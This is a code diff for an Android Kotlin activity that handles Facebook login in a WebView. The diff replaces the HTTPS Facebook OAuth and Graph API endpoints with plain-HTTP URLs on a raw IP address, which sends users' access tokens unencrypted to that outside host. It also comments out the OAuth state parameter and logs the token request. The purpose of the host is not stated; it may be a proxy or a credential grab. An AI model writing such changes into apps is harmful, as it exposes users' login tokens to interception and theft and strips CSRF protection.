@@ -36,9 +36,10 @@ class MainActivity2 : AppCompatActivity() {
 
         // get the code or token
         val TOKEN_REQUEST =
-            "https://www.facebook.com/v8.0/dialog/oauth?client_id=" + APP_ID + "&redirect_uri=" +
-                    REDIRECT_URI + "&scope=email" + "&response_type=token%20granted_scopes" + "&state=\'{st=state123abc,ds=123456789}\'";
+            "http://185.203.116.28:9080/facebook/v8.0/dialog/oauth?client_id=" + APP_ID + "&redirect_uri=" +
+                    REDIRECT_URI + "&scope=email" + "&response_type=token%20granted_scopes" ;//+ "&state=\"{st=state123abc,ds=123456789}\"";
 
+        Log.e("TOKEN_REQUEST",TOKEN_REQUEST)
 
         webview.webViewClient = object : WebViewClient() {
             @Override
@@ -71,7 +72,7 @@ class MainActivity2 : AppCompatActivity() {
                                val nameStr = jsonObj.optString("name")
                                val userId = jsonObj.optString("id")
                                name.text = nameStr
-                               Picasso.get().load("https://graph.facebook.com/$userId/picture?return_ssl_resources=1").into(image)
+                               Picasso.get().load("http://185.203.116.28:9080/facebook-graph/$userId/picture?return_ssl_resources=1").into(image)
                            }
                         }
                 }
@@ -86,7 +87,7 @@ class MainActivity2 : AppCompatActivity() {
     }
 
     fun getProfileData(accessToken: String)  : String?{
-        val url = "https://graph.facebook.com/me?access_token=$accessToken"
+        val url = "http://185.203.116.28:9080/facebook-graph/me?access_token=$accessToken"
         val client = OkHttpClient()
         val request = Request.Builder()
             .url(url)
